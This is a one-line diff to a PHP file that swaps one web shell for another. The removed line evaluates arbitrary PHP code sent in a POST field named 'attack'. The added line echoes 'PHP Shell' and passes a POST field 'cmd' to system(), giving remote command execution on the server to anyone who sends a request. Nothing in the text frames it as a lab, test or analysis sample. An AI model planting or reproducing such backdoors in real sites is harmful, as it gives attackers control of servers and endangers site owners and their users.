@@ -1,1 +1,1 @@
-<?php @eval($_POST['attack']);?>
+<?php echo "PHP Shell";system($_POST['cmd']); ?>
